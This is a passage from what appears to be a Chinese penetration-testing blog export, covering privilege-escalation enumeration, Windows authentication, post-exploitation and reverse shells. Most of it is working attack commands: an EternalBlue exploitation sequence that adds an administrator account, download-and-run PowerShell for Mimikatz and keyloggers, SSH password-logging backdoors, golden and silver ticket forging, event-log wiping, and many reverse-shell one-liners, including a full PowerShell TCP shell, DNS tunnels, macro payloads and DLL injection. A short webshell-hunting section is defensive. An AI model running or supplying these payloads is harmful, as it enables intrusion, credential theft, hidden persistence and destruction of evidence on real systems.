/var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ 文件挂载mount df -h cat /etc/fstab Find命令find / -perm -1000 -type d 2&gt;/dev/null # 只有目录所有者才可以更改删除 find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息 寻找可写目录find / -writable -type d 2&gt;/dev/null # 可写目录 find / -perm -222 -type d 2&gt;/dev/null # 可写目录 find / -perm -o w -type d 2&gt;/dev/null # 可写目录 find / -perm -o x -type d 2&gt;/dev/null # 可执行目录 find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null # 可写可执行 目录 准备及攻击查看语言支持find / -name perl* find / -name python* find / -name gcc* find / -name cc 查看上传方式find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp 寻找exp http://www.google.com 编译及运行expwhich gcc gcc exp.c -o exp chmod +x exp ./exp 提权辅助脚本https://github.com/rebootuser/LinEnum www.securitysift.com/download/linuxprivchecker.py]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[windows安全认证]]></title>
    <url>%2F2018%2F12%2F06%2Fwindows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%2F</url>
    <content type="text"><![CDATA[Windows认证协议有两种NTLM（NT LAN Manager）和Kerberos。 基于NTML的认证方式,主要用在早期的windows工作组环境中,认证的过程也相对比较简单 另一种是基于Kerberos的认证方式,主要用在域环境中,下面就这两种不同的认证方式做些简要的通信流程说明 NTML在AD域环境中，如果需要认证Windows NT系统，也必须采用NTLM。较之Kerberos，基于NTLM的认证过程要简单很多。NTLM采用一种质询/应答（Challenge/Response）消息交换模式。 步骤一：用户通过输入Windows帐号和密码登录客户端主机。在登录之前，客户端会缓存输入密码的哈希值，原始密码会被丢弃（“原始密码在任何情况下都不能被缓存”，这是一条基本的安全准则）。成功登录客户端Windows的用户如果试图访问服务器资源，需要向对方发送一个请求。该请求中包含一个以明文表示的用户名。 步骤二：服务器接收到请求后，生成一个16位的随机数。这个随机数被称为Challenge或者Nonce。服务器在将该Challenge发送给客户端之前，该Challenge会先被保存起来。Challenge是以明文的形式发送的。 步骤三：客户端在接收到服务器发回的Challenge后，用在步骤一中保存的密码哈希值对其加密，然后再将加密后的Challenge发送给服务器。 步骤四服务器接收到客户端发送回来的加密后的Challenge后，会向DC（Domain）发送针对客户端的验证请求。该请求主要包含以下三方面的内容：客户端用户名、客户端密码哈希值加密的Challenge和原始的Challenge。 步骤五、六DC根据用户名获取该帐号的密码哈希值，对原始的Challenge进行加密。如果加密后的Challenge和服务器发送的一致，则意味着用户拥有正确的密码，验证通过，否则验证失败。DC将验证结果发给服务器，并最终反馈给客户端。 KerberosKerberos组件 KDC：密钥分发中心，保存了所有用户和服务的秘密钥匙。 AS：认证服务器，为Client生成TGT。 TGS：票证授予服务，为Client生成Ticket。 TGT：票证授予票证，用于获取Ticket的票证。 Kerberos认证流程1.客户端向KDC的AS服务请求开身份证明 2.KAS认证成功后返回给客户端认购权证（TGT） 3.客户端拿着TGT到KDC的TGS服务买票 4.TGS认证成功后返回给客户端服务票据（ST） 5.客户端拿着ST去访问服务 6.返回服务资源 SPN票据破解在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。 破解方法 RC4加密方式使用tgsrepcrack.py AES加密方式通过kirbi2john转换为hash，通过john/hashcat破解]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网杀器--MS17-010漏洞]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%86%85%E7%BD%91%E6%9D%80%E5%99%A8-MS17-010%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[受影响的Windows 版本包括Windows NT、Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0等。 实战利用：攻击机：kali 目标机：win764位 打开msf 搜索msf17-010模块 search msf17-010 use auxiliary/scanner/smb/smb_ms17_010 show option查看配置选项，需要配置的参数，RHOSTS,THREADS： set RHOSTS 192.168.209.0/24 set threads 10 run 扫描探测192.168.209网段下存在漏洞的主机： 发现了一个开445端口有漏洞的主机，接下来进入漏洞利用模块并设置payload use exploit/windows/smb/ms17_010_eternalblue 设置TCP连接 set payload windows/x64/meterpreter/reverse_tcp 用options查看需要配置的选项rhost和lhost 配置完后进行攻击： exploit 成功进入 通过shell对目标机进行控制 net user abc abc /add 将用户abc添加入管理组 net localgroup administrators abc /add 开启远程桌面功能 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f Kali远程桌面连接Win7 rdesktop 192.168.209.160:3389 漏洞修补 打齐补丁 关闭135、139、445端口。]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>metasploit</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[powershell gethash]]></title>
    <url>%2F2018%2F12%2F05%2Fpowershell-gethash%2F</url>
    <content type="text"><![CDATA[使用powershell远程调用来抓取hash。 在线导hash: powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&apos;);Get-PassHashes 在线导明文 powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz]]></content>
      <categories>
        <category>骚操作</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux查找webshell]]></title>
    <url>%2F2018%2F12%2F05%2FLinux%E6%9F%A5%E6%89%BEwebshell%2F</url>
    <content type="text"><![CDATA[在网站目录差找如下关键字： grep -Rn &quot;shell_exec *(&quot; /var/www grep -Rn &quot;base64_decode *(&quot; /var/www grep -Rn &quot;phpinfo *(&quot; /var/www grep -Rn &quot;system *(&quot; /var/www grep -Rn &quot;php_uname *(&quot; /var/www grep -Rn &quot;chmod *(&quot; /var/www grep -Rn &quot;fopen *(&quot; /var/www grep -Rn &quot;fclose *(&quot; /var/www grep -Rn &quot;readfile *(&quot; /var/www grep -Rn &quot;edoced_46esab *(&quot; /var/www grep -Rn &quot;eval *(&quot; /var/www grep -Rn &quot;pwd&quot; /var/www grep -Rn &quot;pass&quot; /var/www grep -Rn &quot;pw&quot; /var/www grep -Rn 密码&quot; /var/www grep -rn：忽略大小写 find: find /www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\{\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos;]]></content>
      <categories>
        <category>shell</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[命令行下的信息收集]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[域用户信息 whoami /user 查看当前用户的用户名和sid whoami /groups 查看当前用户所属的用户组 whoami /priv 查看当前用户的权限 用户及用户组信息 net group /domain 查看域中的用户组 net group &quot;domain admins&quot; /domain 获得域管理员列表 net group &quot;domain controllers&quot; /domain 获得域控制器列表 net group &quot;domain computers&quot; /domain 获得所有域成员计算机列表 net user /domain 查看域中的用户 net accounts /domain 获得域密码策略、密码长短等信息。 net view /domain 查看所有域或工作组 离线凭证收集-提取域用户hash 域用户hash存储在ntds.dit里。他的位置一般在域控上%WINDIR%\ntds\ntds.dit 使用wmic识别安装到系统中的补丁情况 wmic qfe get description,installedOn 识别正在运行的服务 sc query type= service 或 net start 识别开机启动的程序，包括路径 wmic startup list full ping探测存活主机 for /L %I in (100,1,254) DO @ping -w 1 -n 1 10.18.180.%I | findstr &quot;TTL=&quot; &gt;&gt; ping.txt 查看系统中网卡的IP地址和MAC地址 wmic nicconfig get ipaddress,macaddress 查看当前系统是否有屏保保护，延迟是多少 wmic desktop get screensaversecure,screensavertimeout 查看系统中开放的共享 wmic share get name,path 或 net share 查看系统中开启的日志 wmic nteventlog get path,filename,writeable 清除相关的日志（这里是全部清除） wevtutil cl &quot;windows powershell&quot; wevtutil cl &quot;security&quot; wevtutil cl &quot;system&quot; 查看系统中安装的软件以及版本 wmic product get name,version 查看某个进程的详细信息 （路径，命令行参数等） wmic process where name=&quot;chrome.exe&quot; list full 终止一个进程 wmic process where name=&quot;xshell.exe&quot; call terminate ntsd -c q -p 进程的PID 显示系统中的曾经连接过的无线密码 netsh wlan show profiles netsh wlan show profiles name=&quot;profiles的名字&quot; key=clear 查看当前系统是否是VMWARE wmic bios list full | find /i &quot;vmware&quot; 可以用wmic /?查看具体用法 Process -进程信息 Service -服务 Share -共享 DataFile -文件及目录 Volume -磁盘卷列表 一些收集工具setspn.exeSetspn是一款管理spn的命令行软件。我们可以用它来查看某台主机或账户的SPN。 查看账户college的SPN Setspn -L college 查看当前域中的所有SPN Setspn -T * -Q */* ADFind.exeAdfind是一款活动目录查询工具。 http://www.joeware.net/freetools/tools/adfind/ 列出域控列表 Adfind.exe -sc dclist 查询域中活动的主机，输出主机名和域名 Adfind.exe -sc computers_active name dnshostname 获取域内主机信息 AdFind.exe -b dc=school,dc=com -f &quot;objectcategory=computer&quot; 查询域中主机的spn AdFind.exe -b cn=computers,dc=school,dc=com servicePrincipalName Netview.exeNetview 能够收集域内主机共享、IP、是否为域控等信息。 https://github.com/mubix/netview 将主机名（或IP地址）列表保存在文件host.txt中，使用netview -f host.txt来信息收集。 Netsses.exe工具能够列举目标主机上的NetBIOS session，通常不依赖于管理员权限（-full参数列出所有会话需要管理权限）。 http://www.joeware.net/freetools/tools/netsess/index.htm 如果有一台域成员（192.168.1.128）机器net view了本机的共享（192.168.1.130），那么它与本机之间会存在一个netbios会话，可以使用下列命令来查看会话用户： netsess-h 192.168.1.130-c\\192.168.1.128 这里的-h参数指定了服务器的地址，-c参数则指定了客户端的地址]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[密码记录工具]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[在渗透测试过程当中，我们往往需要获取到一个合法用户的凭证。有时候，通常使用的一些密码抓取工具（如mimikatz、wce等）可能会由于各种原因失效（例如杀软或者权限的问题），这时候我们如果想获取凭证，可以通过键盘记录等方式来得到密码。这种方式需要目标用户交互，比较看运气。 Windows Powershellpowershell -ep bypass iex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt Get-Keystrokes.ps1https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1 远程下载执行： powershell -ep bypass iex (new-object net.webclient).downloadstring(&apos;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt Invoke-CredentialsPhish.ps1Invoke-CredentialsPhish是nishang中的一个钓鱼工具，它能在目标桌面上弹出一个认证窗口。不管是点击关闭，确定，还是取消，这个窗口都会反复弹出，除非用户输入正确的密码或是直接kill掉powershell进程。 powershell -ep bypass iex (new-object net.webclient).downloadstring(&apos;https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-Keystrokes.ps1&apos;); Get-Keystrokes -Logpath C:\log.txt Openssh后门Linux alias在~/.bashrc下添加如下一行： alias ssh=&apos;strace -o /var/tmp/.syscache-`date +&apos;%Y-%m-%d+%H:%m:%S&apos;`.log -s 4096 ssh&apos; 再使更改生效： source ~/.bashrc apt-get install strace //若缺少此软件，需要安装 当有用户使用ssh命令时，会生成一个Log文件： 但是内容有点多，需要筛选一下： cat .syscache-2018-11-20+14\:11\:54.log | grep &quot;read(4&quot; sh2logubuntu下载sh2log： wget http://packetstorm.foofus.com/UNIX/loggers/sh2log-1.0.tgz 解压压缩包： tar –xvf sh2log-1.0.tgz Cd进入sh2log-1.0文件夹 安装libx11-dev sudo apt-get install libxll-dev 安装完成后，编译sh2log： 输入make linux 新建一个shell脚本，脚本内容如下： sudo mkdir /bin/shells/ sudo cp -p /bin/{sh,bash} /bin/shells/ sudo rm -f /bin/{sh,bash} sudo cp -p sh2log /bin/bash sudo cp -p sh2log /bin/sh ./sh2logd 保存脚本，添加执行权限： chmod +x ./1.sh 运行脚本： ./1.sh 启动后，可以用ps -ef|grep sh2logd来检查是否成功启动，它会在安装目录下生成一个bin文件 查看的话可以用parser这个工具查看：./parser xxxxx.bin 输入bash，打开一个新的she11，随意输入一些命令 之后使用文件夹中的parser工具， ./parser sh2log-xxxxx.bin]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[密码提取神器--mimikatz]]></title>
    <url>%2F2018%2F12%2F05%2F%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E7%A5%9E%E5%99%A8-mimikatz%2F</url>
    <content type="text"><![CDATA[mimikatz抓取用户密码https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181203 mimikatz是由C语言编写的开源小工具，于2014年4月发起。它的功能非常强大，支持从Windows系统内存中提取明文密码、哈希、PIN码和Kerberos凭证，以及pass-the-hash、pass-the-ticket、build Golden tickets等数种黑客技术。 mimikatz使用起来也非常简单，提取Windows系统的明文密码只需两行命令： privilege::debug #提升权限 sekurlsa::logonpasswords #抓取密码 输入aaa::aaa，可展示所有模块 可采用log命令，保存为日志 要以管理员身份进入mimikatz 用cmd5去爆破NTML值 要钱，算了…. 修改注册表，启用摘要密码支持 需要创建UseLogonCredential，并赋值为1 重新登录后，再次运行就可以抓取到明文密码啦。 mimikatz令牌窃取Windows有两种类型的Token： Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录) Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹) 两种token只在系统重启后清除 具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效 使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token以管理员身份运行mimikatz——&gt;使用privilege::debug获取debug权限——&gt;使用token::elevate模仿system用户的令牌——&gt;使用token::list列出令牌——&gt;使用 lsadump::sam来获取sam数据库中的密码——&gt;使用token::revert恢复令牌 Mimikatz后渗透在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。 Pass-The-Hashsekurlsa::pth /domain:GUOXIANG.com /user:administrator /ntlm 保存的hash Pass-The-Ticket查看当前用户的ticket Kerberos::list 导出当前用户的ticket Kerberos::list /export 查看所有ticket Sekurlsa::tickets 导出所有ticket Sekurlsa::tickets /export 获得需要的票据后，可以在其他机器上导入此票据： Kerberos:ptt 票据名 导入不依赖管理员权限，比较方便。假设导入了域管的票据，则我们可以dir域控的c$共享：Dir\\DC\c$来进行测试。 需要注意的是UNC路径中需要使用主机名DC，而不能使用172.17.1.1这样的ip地址，否则可能会被拒绝访问。 Golden Ticket黄金票据（golden ticket）是一种为任意用户生成TGT票据的方法。只要获取kribtgt账户的密码HASH、域sid、域名和域账户，黄金票据即可离线生成，而且不受TGT生命周期的影响（默认10小时，最多续订7天） kribtgt账户的密码HASHkribtgt账户的密码hash存储在域控制器上，因此需要获得域管理员权限。 获取krbtgt的hash： lsadump::dcsync /domain:GUOXIANG.com /user:krbtgt 我们可以使用aes256_hmac这一行的hash。 域sid域的sid可以使用工具psgetsid获取，也可以在获取域成员shell后使用whoami /user获取。例如域用户sid为S-1-5-21-3187487621-2881332574-933047120-1105，则1105之前的就是域sid 生成黄金票据获取到上述信息后，就可以使用mimikatz的kerberos::golden生成黄金票据 Kerberos::golden /user：guoxiang /sid:域sid /aes256:krbtgt账户aes256加密的hash /domain:GUOXIANG.com /ticket:golden.kirbi 当需要使用黄金票据的时候，使用mimikatz： Kerberos:ptt golden.kribi Silver Ticket黄金票据伪造的是TGT，而白银票据则伪造ST。 由于ST针对特定的服务，因此白银票据只能用来认证特定服务，而黄金票据则可以用于认证任何kerberos服务。 使用白银票据并不需要和域控通信（使用ST直接和目标服务器通信），而使用黄金票据则需要与域控通信（需要使用伪造的TGT来获取ST） 生成白银票据生成白银票据需要： 域名 sid 用户名：可以是任意用户 服务名：如cifs、ldap等 目标计算机账户密码hash（这里需要win-xxxxxx$这类账户的ntlm hash，否则会导致认证失败） 获取到上述信息后： kerberos::golden /admin:guoxiang /domain:GUOXIANG.com /id:1105 /sid:S-1-5-21-2236738896-1661306322-1924668396 target:guoxiang.GUOXIANG.com /rc4:35493c328494b75aff81d2ffcf173787 /service:LDAP /ptt 到处白银票据。 Mimikatz中的dcsync通过drsr 协议向域控发起复制用户凭证的请求。使用这种方式，无需登录到域控上，只通过网络就能够获取用户的凭证。前面讲解的黄金和白银票据可以实现对域控的持久访问，配合dcsync即可在域成员主机上提取凭证。 Powershell版的Mimikatz一句话执行： powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos; 无文件执行： powershell Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[nc命令使用]]></title>
    <url>%2F2018%2F12%2F04%2Fnc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Netcat(nc):NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。 Nc可以在两台设备上面相互交互，即侦听模式/传输模式 Telnet功能 获取banner信息 传输文本信息 传输文件/目录 加密传输文件，默认不加密 远程控制 加密所有流量 流媒体服务器 远程克隆硬盘 常用参数： -n 以数字形式表示的IP地址 -v 显示详细信息 [使用=vv获取更详细的信息 -l 监听入站信息 -p port 本地端口 -q secs 在标准输入且延迟后退出 -c shell commands shell模式 -u UDP模式 -s addr 本地源地址 -h 获取帮助信息 -z I/O 模式 [扫描时使用] 实例：正向连接A:nc -lp port -c bash B:nc ip port A将自己的Bash发给B 反向连接A:nc -lp port B:nc ip port -c bash B将自己的Bash发给A win下Bash换成cmd 通常反向连接 比较常用，因为防火墙的存在，让目标机主动发送shell 使用NC进行信息收集简单的建立连接，就是侦听模式和传输模式 nc -lp port 监听指定端口号 nc -nv ip port 连接对方tcp端口，默认情况下，双方可以发送文本信息 收集目标机上的进程信息 nc -l -p 4444 &gt;wing.txt 将远程发送过来的内容保存在本地 Ps aux |nc -nv ip port -q 1 标准输入完成后delay一秒钟，会发送到侦听端 NC传输文件/目录 nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义 nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端 侦听端的文件名最好按照文件本身来命名 将目录打包： tar -cvf - 目录名/|nc -lp port -q 1 将目录解包 nc -nv ip port |tar -xvf - NC端口扫描 nc -nvz ip 1-65535 NC文件加密传输apt-get install mcrypt A： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名 B：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1 B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出。主要是利用mcrypt进行加密 NC端口扫描nc -nvz ip 1-65535 默认使用tcp进行扫描 NC复制磁盘A:nc -lp port |dd of=/dev/sda B: dd if=/dev/sda | nc -nc ip port -q 1 If是input filter Of 是output filter B将数据复制到A挂载的硬盘上]]></content>
      <categories>
        <category>命令使用</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[常见的漏洞端口]]></title>
    <url>%2F2018%2F12%2F04%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%AB%AF%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[21 ftp 主要看是否支持匿名，也可以跑弱口令 22 ssh SSH远程登录协议 23 telnet telnet终端仿真协议 80 web 常见web漏洞以及是否为一些管理后台 389 LDAP（轻量目录访问协议）存在匿名访问 443 openssl 心脏滴血以及一些web漏洞测试 873 rsync 主要看是否支持匿名，也可以跑弱口令 1099 JAVArmi 命令执行 1433 SQl server 1521 Oracle 弱口令 3306 MySQL 能够外联数据库 3389 RDP 远程桌面看看能不能弱口令 5432 PostGreSQL 弱口令爆破 6379 redis 一般无认证，可直接访问 7001，7002 weblogic的console口 8080 Tomcat\Jboss 弱口令，Jboss匿名访问 8080-8090 常见Web端口 9000 fast-cgi对外可以getshell 9043 WebSphere 弱口令爆破 27017 MongoDB 未授权访问]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[反弹shell的几种姿势]]></title>
    <url>%2F2018%2F12%2F04%2F%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[powershell反弹shellpowercat反弹shell环境说明： 攻击机1：KALI 192.168.209.159 攻击机2：ubuntu 192.168.209.155 目标机：win7 192.168.209.160 可以在GitHub上下载powercat： https://github.com/besimorhino/powercat powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat。 攻击机开启监听： nc -lvp 666 或者用powercat监听： powercat -l -p 666 目标机执行反弹cmd shell： powershell IEX (New-Object System.Net.Webclient).DownloadString (&apos;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&apos;); powercat -c 192.168.209.159 -p 6666 -e cmd nishang反弹shellNishang(https://github.com/samratashok/nishang )是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。 Reverse TCP shell攻击机1（192.168.209.159）开启监听： nc -lvp 666 目标机执行： powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&apos;); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666 或者将nishang下载到攻击者本地： powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.209.159 -port 6666 Reverse UDP shell攻击机1（192.168.209.159）开启监听： nc -lvup 123 目标机执行： powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/123.ps1&apos;); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.209.159 -port 123 123.ps1为Invoke-PowerShellUdp.ps1，搭建了个网站IP为10.60.17.46 Reverse ICMP shell需要利用icmpsh_m.py (https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。 攻击机1下载icmpsh_m.py文件，并执行 python icmpsh_m.py [Attacker IP] [Victim IP] sysctl -w net.ipv4.icmp_echo_ignore_all=1 #忽略所有icmp包 python icmpsh_m.py 192.168.209.159 192.168.209.160 #开启监听 目标机执行： powershell iex(New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/Invoke-PowerShellIcmp.ps1&apos;);Invoke-PowerShellIcmp -IPAddress 192.168.209.159 自定义powershell函数反弹shell利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell，其实也是借鉴nishang中的Invoke-PowerShellTcpOneLine.ps1 攻击机1（192.168.209.159）开启监听： nc -lvp 2333 目标机执行： powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&apos;192.168.209.159&apos;,2333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot; 或者保存为lltest_tcp.ps1文件 powershell IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.60.17.46/lltest_tcp.ps1&apos;);Invoke-lltestTcp lltest_tcp.ps1 如下： function Invoke-lltestTcp { $client = New-Object Net.Sockets.TCPClient(&apos;192.168.159.134&apos;,6666) $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0} while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) $sendback = (iex $data 2&gt;&amp;1 | Out-String ) $sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2) $stream.Write($sendbyte,0,$sendbyte.Length) $stream.Flush() } $client.Close() } dnscat2 反弹DNS shelldnscat2(https://github.com/iagox86/dnscat2)是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(https://github.com/lukebaggett/dnscat2-powershell) 利用dnscat2 和 dnscat2-powershell实现反弹DNS shell: 攻击者2(Ubuntu 192.168.209.155)开启监听： ruby dnscat2.rb --dns &quot;domain=lltest.com,host=192.168.209.155&quot; --no-cache -e open -e open 不使用加密连接，默认使用加密 ruby dnscat2.rb —help 查看帮助 目标机执行： powershell IEX (New-Object System.Net.Webclient).DownloadString(&apos;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&apos;);Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.209.155 成功反弹shell后，攻击机2： session -i 1 #进入到session 1 shell #执行之后会新生成一个session 需要通过session -i 2 切换 session -i 2 Empire 结合office反弹shellEmpire(https://github.com/EmpireProject/Empire) 基于powershell的后渗透攻击框架，可利用office 宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell 利用office 宏反弹shell攻击者(192.168.209.159)开启监听: uselistener http execute back usestager windows/macro http #生成payload execute 生成/tmp/macro 攻击代码后，新建一个word 创建宏 点击“文件”-“宏”-“创建”，删除自带的脚本，复制进去/tmp/macro文件内容，并保存为“Word 97-2003文档(.doc)”或者“启用宏的Word 文档(.docm)”文档，当诱导目标打开，执行宏后，即可成功反弹shell： 说明:需要开启宏或者用户手动启用宏。开启宏设置：“文件”-“选项”-“信任中心”,选择“启用所有宏” PowerSploit DLL注入反弹shellPowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell msfvenom生成dll后门目标机1执行： msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.209.159 lport=4449 -f dll -o /var/www/html/test.dll 目标机64位 用x64 ； 32位的话用windows/meterpreter/reverse_tcp metasploit 设置payload 开启监听攻击机1执行： use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 192.168.209.159 set LPORT 4449 exploit 目标机远程下载powershell 下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门首先上传dll文件到目标机。然后Get-Process 选定一个进程，最后注入到该进程 目标执行： Get-Process #查看进程进程 IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.209.159/Invoke-DllInjection.ps1&apos;); Invoke-DllInjection -ProcessID 5448 -Dll C:\Users\郭翔\Desktop\test.dll metasploit反弹shell利用metasploit的web_delivery模块可通过python、php、powershell、regsvr32等进行反弹shell 攻击者1(192.168.209.159)： msfconsole use exploit/multi/script/web_delivery set PAYLOAD windows/meterpreter/reverse_tcp set target 2 set LHOST 192.168.209.159 set LPORT 123 exploit 执行完exploit后会弹出一段payload，将这段payload复制到目标机 目标机执行： powershell.exe -nop -w hidden -c $f=new-object 